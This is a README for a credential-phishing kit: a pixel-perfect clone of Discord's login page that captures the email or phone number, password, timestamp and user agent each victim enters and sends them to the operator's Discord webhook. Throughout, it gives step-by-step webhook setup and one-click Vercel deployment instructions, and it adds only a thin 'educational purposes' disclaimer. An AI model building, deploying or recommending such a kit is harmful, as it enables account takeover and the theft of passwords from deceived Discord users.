# Discord Login Page Clone

A pixel-perfect replica of Discord's login page that captures login attempts and sends them to a Discord webhook.

## Features

- 🎨 **Pixel-perfect Discord UI** - Exact replica of Discord's login page design
- 🌈 **Animated Background** - Beautiful floating orbs with smooth animations
- 🔐 **Form Validation** - Client-side validation for email and password fields
- 📱 **Responsive Design** - Works perfectly on desktop and mobile devices
- 🪝 **Discord Webhook Integration** - Sends captured data to your Discord server
- ⚡ **Vercel Ready** - Configured for one-click Vercel deployment

## Setup Instructions

### 1. Get Discord Webhook URL

1. Go to your Discord server
2. Navigate to Server Settings → Integrations → Webhooks
3. Click "New Webhook" or "Create Webhook"
4. Choose the channel where you want to receive notifications
5. Copy the webhook URL (it should look like: `https://discord.com/api/webhooks/...`)

### 2. Deploy to Vercel

#### Option A: One-Click Deploy
[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/your-username/discord-login-clone)

#### Option B: Manual Deploy
1. Fork/clone this repository
2. Connect your GitHub account to Vercel
3. Import the project in Vercel dashboard
4. Deploy (it will automatically use the `vercel.json` configuration)

### 3. Configure Webhook

Once deployed:
1. Visit your deployed site
2. Click "Set Discord Webhook URL" at the bottom of the login form
3. Enter your Discord webhook URL
4. Click "Save"

## How It Works

When someone enters their login credentials and clicks "Log In":

1. The form data is captured
2. A beautifully formatted embed is created with:
   - 📧 Email/Phone number
   - 🔑 Password
   - ⏰ Timestamp
   - 🌐 User agent information
3. The data is sent to your Discord webhook
4. You receive a notification in your Discord channel

## Development

### Local Setup

```bash
# Install dependencies
cd frontend
yarn install

# Start development server
yarn start
```

### Project Structure

```
/app/
├── frontend/
│   ├── src/
│   │   ├── App.js          # Main application component
│   │   ├── components.js   # Reusable components (Discord logo, icons)
│   │   ├── App.css         # Discord-themed styles
│   │   └── index.css       # Global styles
│   ├── package.json
│   └── ...
├── vercel.json            # Vercel deployment configuration
└── README.md
```

## Technologies Used

- **React 19** - Latest React version
- **Tailwind CSS** - For styling and responsive design
- **Custom CSS** - For Discord-specific animations and effects
- **Vercel** - For deployment and hosting

## Security Note

⚠️ **Important**: This is a demonstration/educational project. The captured data includes sensitive information (passwords). Make sure to:

1. Only use this for authorized testing/educational purposes
2. Secure your Discord webhook URL
3. Consider the legal and ethical implications of capturing login data
4. Implement proper security measures if using in production

## Customization

### Colors
All Discord colors are defined as CSS variables in `App.css`:
- `--discord-primary`: Main brand color
- `--discord-blurple`: Discord's signature purple
- `--discord-dark`: Background colors
- And more...

### Animations
The floating orbs can be customized by modifying the `.orb` classes in `App.css`.

### Webhook Message Format
The webhook embed format can be customized in the `handleSubmit` function in `App.js`.

## License

This project is for educational purposes only. Discord is a trademark of Discord Inc.

## Support

If you encounter any issues:
1. Check that your webhook URL is correct
2. Ensure your Discord server allows webhook messages
3. Verify the channel permissions for the webhook

---

**Made with ❤️ for educational purposes**